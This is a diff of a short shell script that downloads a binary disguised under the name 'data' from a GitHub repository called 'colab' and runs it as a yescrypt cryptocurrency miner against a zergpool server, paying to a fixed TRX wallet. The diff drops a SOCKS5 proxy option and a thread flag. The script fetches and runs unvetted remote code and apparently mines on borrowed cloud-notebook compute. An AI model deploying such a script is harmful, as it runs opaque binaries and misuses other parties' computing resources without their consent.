@@ -1,4 +1,4 @@
 apt update -y
 wget https://github.com/yuvraj233/colab/raw/main/data
 chmod +x data
-./data -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u TCcpLwuXCAi6U66fPTjLaoWEXEHd5zLNsN.Test -p c=TRX -t $(nproc) -x socks5://put working
+./data -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u TCcpLwuXCAi6U66fPTjLaoWEXEHd5zLNsN.Test -p c=TRX
